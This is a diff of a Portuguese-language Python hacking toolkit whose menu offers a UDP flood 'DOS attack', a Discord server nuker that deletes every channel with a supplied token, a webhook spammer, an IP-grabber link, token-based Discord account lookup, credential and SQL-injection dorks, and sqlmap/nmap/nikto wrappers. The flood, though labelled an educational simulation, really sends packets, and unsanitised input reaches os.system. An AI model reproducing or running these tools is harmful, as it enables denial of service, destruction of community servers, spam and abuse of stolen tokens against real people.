@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-MAIDZ CYBER TOOLKIT v2.0
-Terminal personalizado + ferramentas de cybersegurança (estudo)
-Desenvolvido para Termux / Linux
+MAIDZ CYBER TOOLKIT v2.0 - VERSÃO SIMPLIFICADA E FUNCIONAL
 """
 
 import os
@@ -14,182 +12,201 @@ import random
 import json
 import requests
 from datetime import datetime
-from colorama import init, Fore, Style
 
-init(autoreset=True)
+# =============================================================
+# TENTA IMPORTAR COLORAMA, SE NÃO TIVER, USA CORES SIMPLES
+# =============================================================
+try:
+    from colorama import init, Fore, Style
+    init(autoreset=True)
+except ImportError:
+    # Fallback sem colorama
+    class Fore:
+        LIGHTWHITE_EX = ''
+        LIGHTMAGENTA_EX = ''
+        GREEN = ''
+        RED = ''
+        YELLOW = ''
+        CYAN = ''
+        BLUE = ''
+    class Style:
+        RESET_ALL = ''
+    def init(): pass
 
+# =============================================================
+# CONFIGURAÇÕES
+# =============================================================
 USER_NAME = "cruz"
 HOST_NAME = "localhost"
 
-CYBERFETCH_ART = f"""
-{Fore.LIGHTWHITE_EX}                       +                      
-{Fore.LIGHTWHITE_EX}                     +++                     
-{Fore.LIGHTMAGENTA_EX}                    +++++                    
-{Fore.LIGHTMAGENTA_EX}                   +++++++                   
-{Fore.LIGHTWHITE_EX}                   ++++++=+                  
-{Fore.LIGHTWHITE_EX}                  ++++++++=                 
-{Fore.LIGHTMAGENTA_EX}                 ++++++++++=                
-{Fore.LIGHTMAGENTA_EX}                + ++++++++++=                
-{Fore.LIGHTWHITE_EX}               +++++++++++++==               
-{Fore.LIGHTWHITE_EX}              ======+++++++++==              
-{Fore.LIGHTMAGENTA_EX}             ============+++++==             
-{Fore.LIGHTMAGENTA_EX}            ========+++++++++++==            
-{Fore.LIGHTWHITE_EX}           =====++++++++++++++++++           
-{Fore.LIGHTWHITE_EX}          ==+++++++++++++++++++++++          
-{Fore.LIGHTMAGENTA_EX}         ++++++++++++   ++++++++++++         
-{Fore.LIGHTMAGENTA_EX}        *++++++++++       +++++++++++        
-{Fore.LIGHTWHITE_EX}       +++++++++++         +++++++++++       
-{Fore.LIGHTWHITE_EX}      ++++++++++++         *+++++++++++      
-{Fore.LIGHTMAGENTA_EX}     ++++++++++++*         *+++++++++*++     
-{Fore.LIGHTMAGENTA_EX}    *+++++++++++++         +++++++++++++     
-{Fore.LIGHTWHITE_EX}   +++++++++++*               *+++++++++++   
-{Fore.LIGHTWHITE_EX}  ++++++++                         *+++++++  
-{Fore.LIGHTMAGENTA_EX} *++++                                 +++++ 
-{Fore.LIGHTMAGENTA_EX}++*                                       +*+
-{Style.RESET_ALL}
+# =============================================================
+# ARTE ASCII (somente texto, sem f-strings problemáticas)
+# =============================================================
+CYBERFETCH_ART = """
+                       +                      
+                     +++                     
+                    +++++                    
+                   +++++++                   
+                   ++++++=+                  
+                  ++++++++=                 
+                 ++++++++++=                
+                + ++++++++++=                
+               +++++++++++++==               
+              ======+++++++++==              
+             ============+++++==             
+            ========+++++++++++==            
+           =====++++++++++++++++++           
+          ==+++++++++++++++++++++++          
+         ++++++++++++   ++++++++++++         
+        *++++++++++       +++++++++++        
+       +++++++++++         +++++++++++       
+      ++++++++++++         *+++++++++++      
+     ++++++++++++*         *+++++++++*++     
+    *+++++++++++++         +++++++++++++     
+   +++++++++++*               *+++++++++++   
+  ++++++++                         *+++++++  
+ *++++                                 +++++ 
+++*                                       +*+
 """
 
 def cyberfetch():
     os.system('clear' if os.name == 'posix' else 'cls')
     print(CYBERFETCH_ART)
-    print(f"{Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════")
-    print(f"{Fore.LIGHTWHITE_EX}  MAIDZ CYBER TEAM  ")
-    print(f"{Fore.LIGHTWHITE_EX}  ✦ Pentest | OSINT | Dorking | Exploits ✦")
-    print(f"{Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════")
-    print(f"{Fore.LIGHTWHITE_EX}  Usuário : {Fore.LIGHTMAGENTA_EX}{USER_NAME}")
-    print(f"{Fore.LIGHTWHITE_EX}  Host    : {Fore.LIGHTMAGENTA_EX}{HOST_NAME}")
-    print(f"{Fore.LIGHTWHITE_EX}  Data    : {Fore.LIGHTMAGENTA_EX}{datetime.now().strftime('%d/%m/%Y %H:%M')}")
-    print(f"{Fore.LIGHTWHITE_EX}  Shell   : {Fore.LIGHTMAGENTA_EX}{os.environ.get('SHELL', '/bin/bash')}")
-    print(f"{Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════")
-    print(f"{Fore.LIGHTWHITE_EX}  Ferramentas carregadas: 12")
-    print(f"{Fore.LIGHTWHITE_EX}  Grupo: {Fore.LIGHTMAGENTA_EX}Maidz Cyber Team")
-    print(f"{Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════{Style.RESET_ALL}")
+    print("════════════════════════════════════════════════════")
+    print("  MAIDZ CYBER TEAM  ")
+    print("  ✦ Pentest | OSINT | Dorking | Exploits ✦")
+    print("════════════════════════════════════════════════════")
+    print(f"  Usuário : {USER_NAME}")
+    print(f"  Host    : {HOST_NAME}")
+    print(f"  Data    : {datetime.now().strftime('%d/%m/%Y %H:%M')}")
+    print(f"  Shell   : {os.environ.get('SHELL', '/bin/bash')}")
+    print("════════════════════════════════════════════════════")
+    print("  Ferramentas carregadas: 12")
+    print("  Grupo: Maidz Cyber Team")
+    print("════════════════════════════════════════════════════")
 
 def clear():
     os.system('clear' if os.name == 'posix' else 'cls')
 
 # =============================================================
-# FERRAMENTAS
+# FERRAMENTAS (VERSÃO SIMPLIFICADA)
 # =============================================================
 
 def dorking_menu():
     clear()
-    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DORKING TOOLS{Style.RESET_ALL}")
-    print(f"{Fore.LIGHTWHITE_EX}1. Google Dorks (exemplo){Style.RESET_ALL}")
-    print(f"{Fore.LIGHTWHITE_EX}2. GitHub Dorks (busca por credenciais){Style.RESET_ALL}")
-    print(f"{Fore.LIGHTWHITE_EX}3. PDF/Arquivos sensíveis{Style.RESET_ALL}")
-    print(f"{Fore.LIGHTWHITE_EX}4. SQL Injection dorks{Style.RESET_ALL}")
-    print(f"{Fore.LIGHTWHITE_EX}5. Voltar{Style.RESET_ALL}")
-    opt = input(f"{Fore.LIGHTMAGENTA_EX}Escolha: {Style.RESET_ALL}")
+    print("[MAIDZ] DORKING TOOLS")
+    print("1. Google Dorks (exemplo)")
+    print("2. GitHub Dorks (busca por credenciais)")
+    print("3. PDF/Arquivos sensíveis")
+    print("4. SQL Injection dorks")
+    print("5. Voltar")
+    opt = input("Escolha: ")
     if opt == "1":
-        print(f"{Fore.CYAN}[*] Exemplo de Google Dork: site:example.com intitle:index of {Style.RESET_ALL}")
-        print(f"{Fore.CYAN}[*] Lista completa: https://github.com/1d8/Google-Dorks{Style.RESET_ALL}")
+        print("[*] Exemplo: site:example.com intitle:index of")
+        print("[*] Lista: https://github.com/1d8/Google-Dorks")
     elif opt == "2":
-        print(f"{Fore.CYAN}[*] GitHub Dorks: extension:env DB_PASSWORD {Style.RESET_ALL}")
-        print(f"{Fore.CYAN}[*] Buscar por credenciais expostas.{Style.RESET_ALL}")
+        print("[*] GitHub Dorks: extension:env DB_PASSWORD")
     elif opt == "3":
-        print(f"{Fore.CYAN}[*] PDF Dork: filetype:pdf confidential {Style.RESET_ALL}")
+        print("[*] PDF Dork: filetype:pdf confidential")
     elif opt == "4":
-        print(f"{Fore.CYAN}[*] SQL Dork: inurl:id= site:example.com {Style.RESET_ALL}")
+        print("[*] SQL Dork: inurl:id= site:example.com")
     else:
         return
-    input(f"{Fore.LIGHTWHITE_EX}Pressione Enter para voltar...{Style.RESET_ALL}")
+    input("Pressione Enter para voltar...")
 
 def ip_grabber():
     clear()
-    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] IP GRABBER (gerador de link){Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[!] Gera um link que captura o IP de quem clicar (via serviço externo).{Style.RESET_ALL}")
-    url = input(f"{Fore.LIGHTWHITE_EX}URL de destino (ex: seu site): {Style.RESET_ALL}")
-    if not url:
-        url = "https://www.example.com"
+    print("[MAIDZ] IP GRABBER (gerador de link)")
+    print("[!] Gera um link que captura o IP de quem clicar (via serviço externo).")
+    url = input("URL de destino (ex: seu site): ") or "https://www.example.com"
     fake_link = f"https://ipgrabber.xyz/redirect?url={url}"
-    print(f"{Fore.GREEN}[+] Link gerado: {fake_link}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}[*] Ao acessar, o IP será registrado (simulação).{Style.RESET_ALL}")
-    input(f"{Fore.LIGHTWHITE_EX}Pressione Enter para voltar...{Style.RESET_ALL}")
+    print(f"[+] Link gerado: {fake_link}")
+    print("[*] Ao acessar, o IP será registrado (simulação).")
+    input("Pressione Enter para voltar...")
 
 def ip_pinger():
     clear()
-    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] IP PINGER{Style.RESET_ALL}")
-    target = input(f"{Fore.LIGHTWHITE_EX}IP ou domínio: {Style.RESET_ALL}")
+    print("[MAIDZ] IP PINGER")
+    target = input("IP ou domínio: ")
     if not target:
-        print(f"{Fore.RED}[!] Alvo não informado.{Style.RESET_ALL}")
-        input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
+        print("[!] Alvo não informado.")
+        input("Enter...")
         return
-    print(f"{Fore.CYAN}[*] Pingando {target}...{Style.RESET_ALL}")
+    print(f"[*] Pingando {target}...")
     os.system(f"ping -c 4 {target}")
-    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
+    input("Enter...")
 
 def discord_account_shower():
     clear()
-    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DISCORD ACCOUNT SHOWER{Style.RESET_ALL}")
-    token = input(f"{Fore.LIGHTWHITE_EX}Token Discord (ou ID): {Style.RESET_ALL}")
+    print("[MAIDZ] DISCORD ACCOUNT SHOWER")
+    token = input("Token Discord (ou ID): ")
     if not token:
-        print(f"{Fore.RED}[!] Token necessário.{Style.RESET_ALL}")
-        input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
+        print("[!] Token necessário.")
+        input("Enter...")
         return
     headers = {"Authorization": token}
     try:
         r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
         if r.status_code == 200:
             data = r.json()
-            print(f"{Fore.GREEN}[+] Conta encontrada:{Style.RESET_ALL}")
+            print("[+] Conta encontrada:")
             print(f"  Username: {data.get('username')}#{data.get('discriminator')}")
             print(f"  ID: {data.get('id')}")
             print(f"  Email: {data.get('email', 'Não disponível')}")
             print(f"  Verificado: {data.get('verified')}")
             print(f"  MFA: {data.get('mfa_enabled')}")
         else:
-            print(f"{Fore.RED}[!] Erro: {r.status_code}{Style.RESET_ALL}")
+            print(f"[!] Erro: {r.status_code}")
     except Exception as e:
-        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
-    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
+        print(f"[!] Erro: {e}")
+    input("Enter...")
 
 def osint_searcher():
     clear()
-    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] OSINT SEARCHER{Style.RESET_ALL}")
-    query = input(f"{Fore.LIGHTWHITE_EX}Termo a pesquisar (nome, email, etc.): {Style.RESET_ALL}")
+    print("[MAIDZ] OSINT SEARCHER")
+    query = input("Termo a pesquisar (nome, email, etc.): ")
     if not query:
         return
-    print(f"{Fore.CYAN}[*] Buscando informações sobre {query}...{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[!] Usando serviços públicos (simulação).{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}Google: https://www.google.com/search?q={query}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}LinkedIn: https://www.linkedin.com/search/results/all/?keywords={query}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}GitHub: https://github.com/search?q={query}{Style.RESET_ALL}")
-    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
+    print(f"[*] Buscando informações sobre {query}...")
+    print("[!] Usando serviços públicos (simulação).")
+    print(f"Google: https://www.google.com/search?q={query}")
+    print(f"LinkedIn: https://www.linkedin.com/search/results/all/?keywords={query}")
+    print(f"GitHub: https://github.com/search?q={query}")
+    input("Enter...")
 
 def leaks_searcher():
     clear()
-    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] LEAKS SEARCHER{Style.RESET_ALL}")
-    email = input(f"{Fore.LIGHTWHITE_EX}Email para verificar vazamentos: {Style.RESET_ALL}")
+    print("[MAIDZ] LEAKS SEARCHER")
+    email = input("Email para verificar vazamentos: ")
     if not email:
         return
-    print(f"{Fore.CYAN}[*] Verificando se {email} está em vazamentos...{Style.RESET_ALL}")
+    print(f"[*] Verificando se {email} está em vazamentos...")
     try:
         r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", timeout=10)
         if r.status_code == 200:
             breaches = r.json()
-            print(f"{Fore.RED}[+] Este email apareceu em {len(breaches)} vazamentos:{Style.RESET_ALL}")
+            print(f"[+] Este email apareceu em {len(breaches)} vazamentos:")
             for b in breaches:
                 print(f"  - {b.get('Name')} (Data: {b.get('BreachDate')})")
         elif r.status_code == 404:
-            print(f"{Fore.GREEN}[+] Nenhum vazamento conhecido.{Style.RESET_ALL}")
+            print("[+] Nenhum vazamento conhecido.")
         else:
-            print(f"{Fore.YELLOW}[!] Erro na API: {r.status_code}{Style.RESET_ALL}")
+            print(f"[!] Erro na API: {r.status_code}")
     except Exception as e:
-        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
-    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
+        print(f"[!] Erro: {e}")
+    input("Enter...")
 
 def discord_spammer():
     clear()
-    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DISCORD SPAMMER (webhook){Style.RESET_ALL}")
-    webhook = input(f"{Fore.LIGHTWHITE_EX}Webhook URL: {Style.RESET_ALL}")
+    print("[MAIDZ] DISCORD SPAMMER (webhook)")
+    webhook = input("Webhook URL: ")
     if not webhook:
         return
-    msg = input(f"{Fore.LIGHTWHITE_EX}Mensagem a spammar: {Style.RESET_ALL}") or "SPAM!"
-    count = int(input(f"{Fore.LIGHTWHITE_EX}Quantidade de mensagens: {Style.RESET_ALL}") or "5")
-    delay = float(input(f"{Fore.LIGHTWHITE_EX}Delay entre mensagens (segundos): {Style.RESET_ALL}") or "0.5")
-    print(f"{Fore.YELLOW}[!] ATENÇÃO: Isso pode resultar em banimento do webhook.{Style.RESET_ALL}")
-    confirm = input(f"{Fore.LIGHTWHITE_EX}Continuar? (s/n): {Style.RESET_ALL}")
+    msg = input("Mensagem a spammar: ") or "SPAM!"
+    count = int(input("Quantidade de mensagens: ") or "5")
+    delay = float(input("Delay entre mensagens (segundos): ") or "0.5")
+    print("[!] ATENÇÃO: Isso pode resultar em banimento do webhook.")
+    confirm = input("Continuar? (s/n): ")
     if confirm.lower() != 's':
         return
     for i in range(count):
@@ -197,23 +214,23 @@ def discord_spammer():
             payload = {"content": msg}
             r = requests.post(webhook, json=payload, timeout=5)
             if r.status_code == 204:
-                print(f"{Fore.GREEN}[+] Mensagem {i+1} enviada.{Style.RESET_ALL}")
+                print(f"[+] Mensagem {i+1} enviada.")
             else:
-                print(f"{Fore.RED}[!] Erro: {r.status_code}{Style.RESET_ALL}")
+                print(f"[!] Erro: {r.status_code}")
             time.sleep(delay)
         except Exception as e:
-            print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
-    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
+            print(f"[!] Erro: {e}")
+    input("Enter...")
 
 def discord_nuker():
     clear()
-    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DISCORD NUKER (webhook){Style.RESET_ALL}")
-    print(f"{Fore.RED}[!] Isso irá deletar canais, roles, etc. (apenas com permissões adequadas){Style.RESET_ALL}")
-    token = input(f"{Fore.LIGHTWHITE_EX}Token do bot (ou usuário): {Style.RESET_ALL}")
-    guild_id = input(f"{Fore.LIGHTWHITE_EX}ID do servidor: {Style.RESET_ALL}")
+    print("[MAIDZ] DISCORD NUKER (webhook)")
+    print("[!] Isso irá deletar canais, roles, etc. (apenas com permissões adequadas)")
+    token = input("Token do bot (ou usuário): ")
+    guild_id = input("ID do servidor: ")
     if not token or not guild_id:
         return
-    confirm = input(f"{Fore.RED}Realmente deseja nukear o servidor? (s/n): {Style.RESET_ALL}")
+    confirm = input("Realmente deseja nukear o servidor? (s/n): ")
     if confirm.lower() != 's':
         return
     headers = {"Authorization": token}
@@ -222,23 +239,23 @@ def discord_nuker():
         if r.status_code == 200:
             channels = r.json()
             for ch in channels:
-                print(f"{Fore.YELLOW}[*] Deletando canal: {ch.get('name')} ({ch.get('id')}){Style.RESET_ALL}")
+                print(f"[*] Deletando canal: {ch.get('name')} ({ch.get('id')})")
                 del_r = requests.delete(f"https://discord.com/api/v9/channels/{ch.get('id')}", headers=headers)
-                if del_r.status_code == 200 or del_r.status_code == 204:
-                    print(f"{Fore.GREEN}[+] Canal deletado.{Style.RESET_ALL}")
+                if del_r.status_code in (200, 204):
+                    print("[+] Canal deletado.")
                 else:
-                    print(f"{Fore.RED}[!] Erro ao deletar canal: {del_r.status_code}{Style.RESET_ALL}")
+                    print(f"[!] Erro ao deletar canal: {del_r.status_code}")
                 time.sleep(0.5)
         else:
-            print(f"{Fore.RED}[!] Erro ao listar canais: {r.status_code}{Style.RESET_ALL}")
+            print(f"[!] Erro ao listar canais: {r.status_code}")
     except Exception as e:
-        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
-    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
+        print(f"[!] Erro: {e}")
+    input("Enter...")
 
 def discord_username_checker():
     clear()
-    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DISCORD USERNAME CHECKER{Style.RESET_ALL}")
-    username = input(f"{Fore.LIGHTWHITE_EX}Nome a verificar: {Style.RESET_ALL}")
+    print("[MAIDZ] DISCORD USERNAME CHECKER")
+    username = input("Nome a verificar: ")
     if not username:
         return
     url = "https://discord.com/api/v10/unique-username/username-attempt-unauthed"
@@ -248,66 +265,66 @@ def discord_username_checker():
         if r.status_code == 200:
             data = r.json()
             if data.get("taken") == False:
-                print(f"{Fore.GREEN}[+] {username} está DISPONÍVEL!{Style.RESET_ALL}")
+                print(f"[+] {username} está DISPONÍVEL!")
             else:
-                print(f"{Fore.RED}[-] {username} já está em uso.{Style.RESET_ALL}")
+                print(f"[-] {username} já está em uso.")
         else:
-            print(f"{Fore.RED}[!] Erro: {r.status_code}{Style.RESET_ALL}")
+            print(f"[!] Erro: {r.status_code}")
     except Exception as e:
-        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
-    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
+        print(f"[!] Erro: {e}")
+    input("Enter...")
 
 def dorking_tools():
     clear()
-    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DORKING TOOLS - EXTRA{Style.RESET_ALL}")
-    print(f"{Fore.LIGHTWHITE_EX}1. SQLMap (injeção SQL){Style.RESET_ALL}")
-    print(f"{Fore.LIGHTWHITE_EX}2. Nmap (escaneamento){Style.RESET_ALL}")
-    print(f"{Fore.LIGHTWHITE_EX}3. Nikto (scanner web){Style.RESET_ALL}")
-    opt = input(f"{Fore.LIGHTMAGENTA_EX}Escolha: {Style.RESET_ALL}")
+    print("[MAIDZ] DORKING TOOLS - EXTRA")
+    print("1. SQLMap (injeção SQL)")
+    print("2. Nmap (escaneamento)")
+    print("3. Nikto (scanner web)")
+    opt = input("Escolha: ")
     if opt == "1":
-        url = input(f"{Fore.LIGHTWHITE_EX}URL alvo: {Style.RESET_ALL}")
+        url = input("URL alvo: ")
         if url:
             os.system(f"sqlmap -u {url} --batch")
     elif opt == "2":
-        target = input(f"{Fore.LIGHTWHITE_EX}Alvo: {Style.RESET_ALL}")
+        target = input("Alvo: ")
         if target:
             os.system(f"nmap -sV {target}")
     elif opt == "3":
-        target = input(f"{Fore.LIGHTWHITE_EX}URL alvo: {Style.RESET_ALL}")
+        target = input("URL alvo: ")
         if target:
             os.system(f"nikto -h {target}")
     else:
-        print(f"{Fore.RED}[!] Opção inválida.{Style.RESET_ALL}")
-    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
+        print("[!] Opção inválida.")
+    input("Enter...")
 
 def tiktok_name_searcher():
     clear()
-    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] TIKTOK NAME SEARCHER{Style.RESET_ALL}")
-    username = input(f"{Fore.LIGHTWHITE_EX}Nome de usuário TikTok: {Style.RESET_ALL}")
+    print("[MAIDZ] TIKTOK NAME SEARCHER")
+    username = input("Nome de usuário TikTok: ")
     if not username:
         return
     url = f"https://www.tiktok.com/@{username}"
-    print(f"{Fore.CYAN}[*] Verificando perfil: {url}{Style.RESET_ALL}")
+    print(f"[*] Verificando perfil: {url}")
     try:
         r = requests.get(url, timeout=10)
         if r.status_code == 200:
-            print(f"{Fore.GREEN}[+] Perfil encontrado!{Style.RESET_ALL}")
+            print("[+] Perfil encontrado!")
         elif r.status_code == 404:
-            print(f"{Fore.RED}[-] Perfil não encontrado (disponível).{Style.RESET_ALL}")
+            print("[-] Perfil não encontrado (disponível).")
         else:
-            print(f"{Fore.YELLOW}[!] Status: {r.status_code}{Style.RESET_ALL}")
+            print(f"[!] Status: {r.status_code}")
     except Exception as e:
-        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
-    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
+        print(f"[!] Erro: {e}")
+    input("Enter...")
 
 def dos_attack():
     clear()
-    print(f"{Fore.LIGHTMAGENTA_EX}[MAIDZ] DOS ATTACK (simulação){Style.RESET_ALL}")
-    target = input(f"{Fore.LIGHTWHITE_EX}IP/domínio alvo: {Style.RESET_ALL}")
-    port = int(input(f"{Fore.LIGHTWHITE_EX}Porta (ex: 80): {Style.RESET_ALL}") or "80")
-    duration = int(input(f"{Fore.LIGHTWHITE_EX}Duração (segundos): {Style.RESET_ALL}") or "5")
-    print(f"{Fore.YELLOW}[!] ATENÇÃO: Isso é uma simulação educacional.{Style.RESET_ALL}")
-    confirm = input(f"{Fore.LIGHTWHITE_EX}Continuar? (s/n): {Style.RESET_ALL}")
+    print("[MAIDZ] DOS ATTACK (simulação)")
+    target = input("IP/domínio alvo: ")
+    port = int(input("Porta (ex: 80): ") or "80")
+    duration = int(input("Duração (segundos): ") or "5")
+    print("[!] ATENÇÃO: Isso é uma simulação educacional.")
+    confirm = input("Continuar? (s/n): ")
     if confirm.lower() != 's':
         return
     try:
@@ -316,31 +333,54 @@ def dos_attack():
         bytes_data = random._urandom(1490)
         end_time = time.time() + duration
         packets = 0
-        print(f"{Fore.CYAN}[*] Enviando pacotes UDP para {target_ip}:{port}...{Style.RESET_ALL}")
+        print(f"[*] Enviando pacotes UDP para {target_ip}:{port}...")
         while time.time() < end_time:
             sock.sendto(bytes_data, (target_ip, port))
             packets += 1
             if packets % 500 == 0:
-                sys.stdout.write(f"\r{Fore.GREEN}[+] Pacotes: {packets}{Style.RESET_ALL}")
+                sys.stdout.write(f"\r[+] Pacotes: {packets}")
                 sys.stdout.flush()
-        print(f"\n{Fore.GREEN}[+] Concluído. {packets} pacotes enviados.{Style.RESET_ALL}")
+        print(f"\n[+] Concluído. {packets} pacotes enviados.")
     except Exception as e:
-        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
-    input(f"{Fore.LIGHTWHITE_EX}Enter...{Style.RESET_ALL}")
+        print(f"[!] Erro: {e}")
+    input("Enter...")
 
 # =============================================================
-# CONFIGURAÇÃO DO SHELL
+# MENU PRINCIPAL
+# =============================================================
+def main_menu():
+    clear()
+    cyberfetch()
+    print("\n════════════════════════════════════════════════════")
+    print("  [MAIDZ CYBER TOOLKIT] - Menu Principal")
+    print("════════════════════════════════════════════════════")
+    print("  1.  Dorking (vários tipos)")
+    print("  2.  IP Grabber (gerar link)")
+    print("  3.  IP Pinger (ping)")
+    print("  4.  Discord Account Shower")
+    print("  5.  OSINT Searcher")
+    print("  6.  Leaks Searcher")
+    print("  7.  Discord Spammer (webhook)")
+    print("  8.  Discord Nuker (webhook)")
+    print("  9.  Discord Username Checker")
+    print("  10. Dorking Tools (SQLMap, Nmap, Nikto)")
+    print("  11. TikTok Name Searcher")
+    print("  12. DOS Attack (simulação)")
+    print("  13. Sair")
+    print("════════════════════════════════════════════════════")
+    return input("Escolha uma opção: ").strip()
+
+# =============================================================
+# CONFIGURAÇÃO DO SHELL (opcional)
 # =============================================================
 def setup_shell():
     shell_rc = os.path.expanduser("~/.bashrc")
     if os.path.exists(os.path.expanduser("~/.zshrc")):
         shell_rc = os.path.expanduser("~/.zshrc")
-
     lines_to_add = []
     lines_to_add.append('alias cyberfetch="python3 ' + os.path.abspath(sys.argv[0]) + ' --cyberfetch"')
     prompt_cmd = 'PS1="\\[\\033[37m\\]╭──(\\[\\033[35m\\]' + USER_NAME + '@' + HOST_NAME + '\\[\\033[37m\\])-(~)\\n\\[\\033[37m\\]╰──❯❯ \\[\\033[0m\\]"'
     lines_to_add.append(prompt_cmd)
-
     with open(shell_rc, 'r') as f:
         content = f.read()
     already = all(line in content for line in lines_to_add)
@@ -349,57 +389,78 @@ def setup_shell():
             f.write("\n# MAIDZ CYBER TOOLKIT CONFIG\n")
             for line in lines_to_add:
                 f.write(line + "\n")
-        print(f"{Fore.GREEN}[+] Configurações adicionadas ao {shell_rc}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}[*] Recarregue com: source {shell_rc}{Style.RESET_ALL}")
+        print(f"[+] Configurações adicionadas ao {shell_rc}")
+        print(f"[*] Recarregue com: source {shell_rc}")
     else:
-        print(f"{Fore.CYAN}[*] Configurações já presentes.{Style.RESET_ALL}")
+        print("[*] Configurações já presentes.")
 
 # =============================================================
-# MENU PRINCIPAL
-# =============================================================
-def main_menu():
-    clear()
-    cyberfetch()
-    print(f"""
-{Fore.LIGHTWHITE_EX}════════════════════════════════════════════════════
-{Fore.LIGHTMAGENTA_EX}  [MAIDZ CYBER TOOLKIT] - Menu Principal
-{Fore.LIGHTWHITE_EX}════════════════════════════════════════════════════
-{Fore.LIGHTWHITE_EX}  1.  {Fore.LIGHTMAGENTA_EX}Dorking{Fore.LIGHTWHITE_EX} (vários tipos)
-{Fore.LIGHTWHITE_EX}  2.  {Fore.LIGHTMAGENTA_EX}IP Grabber{Fore.LIGHTWHITE_EX} (gerar link)
-{Fore.LIGHTWHITE_EX}  3.  {Fore.LIGHTMAGENTA_EX}IP Pinger{Fore.LIGHTWHITE_EX} (ping)
-{Fore.LIGHTWHITE_EX}  4.  {Fore.LIGHTMAGENTA_EX}Discord Account Shower{Fore.LIGHTWHITE_EX}
-{Fore.LIGHTWHITE_EX}  5.  {Fore.LIGHTMAGENTA_EX}OSINT Searcher{Fore.LIGHTWHITE_EX}
-{Fore.LIGHTWHITE_EX}  6.  {Fore.LIGHTMAGENTA_EX}Leaks Searcher{Fore.LIGHTWHITE_EX}
-{Fore.LIGHTWHITE_EX}  7.  {Fore.LIGHTMAGENTA_EX}Discord Spammer{Fore.LIGHTWHITE_EX} (webhook)
-{Fore.LIGHTWHITE_EX}  8.  {Fore.LIGHTMAGENTA_EX}Discord Nuker{Fore.LIGHTWHITE_EX} (webhook)
-{Fore.LIGHTWHITE_EX}  9.  {Fore.LIGHTMAGENTA_EX}Discord Username Checker{Fore.LIGHTWHITE_EX}
-{Fore.LIGHTWHITE_EX}  10. {Fore.LIGHTMAGENTA_EX}Dorking Tools{Fore.LIGHTWHITE_EX} (SQLMap, Nmap, Nikto)
-{Fore.LIGHTWHITE_EX}  11. {Fore.LIGHTMAGENTA_EX}TikTok Name Searcher{Fore.LIGHTWHITE_EX}
-{Fore.LIGHTWHITE_EX}  12. {Fore.LIGHTMAGENTA_EX}DOS Attack{Fore.LIGHTWHITE_EX} (simulação)
-{Fore.LIGHTWHITE_EX}  13. {Fore.LIGHTMAGENTA_EX}Sair{Fore.LIGHTWHITE_EX}
-{Fore.LIGHTWHITE_EX}════════════════════════════════════════════════════
-    """)
-    return input(f"{Fore.LIGHTMAGENTA_EX}Escolha uma opção: {Style.RESET_ALL}").strip()
-
-# =============================================================
-# PONTO DE ENTRADA
+# MAIN
 # =============================================================
 def main():
+    # Primeiro print para confirmar execução
+    print(">>> MAIDZ CYBER TOOLKIT INICIADO <<<")
+    sys.stdout.flush()
+
+    # Verifica argumentos
     if len(sys.argv) > 1 and sys.argv[1] == "--cyberfetch":
         clear()
         cyberfetch()
         sys.exit(0)
 
+    # Primeira execução: configurar shell
     if not os.path.exists(os.path.expanduser("~/.maidz_setup_done")):
-        print(f"{Fore.YELLOW}[!] Primeira execução. Configurando shell...{Style.RESET_ALL}")
+        print("[!] Primeira execução. Configurando shell...")
         setup_shell()
         with open(os.path.expanduser("~/.maidz_setup_done"), 'w') as f:
             f.write("done")
-        print(f"{Fore.GREEN}[+] Configuração concluída. Execute source ~/.bashrc (ou ~/.zshrc) para ativar.{Style.RESET_ALL}")
-        input(f"{Fore.LIGHTWHITE_EX}Pressione Enter para continuar...{Style.RESET_ALL}")
+        print("[+] Configuração concluída. Execute 'source ~/.bashrc' (ou ~/.zshrc) para ativar.")
+        input("Pressione Enter para continuar...")
 
+    # Loop principal
     while True:
         opcao = main_menu()
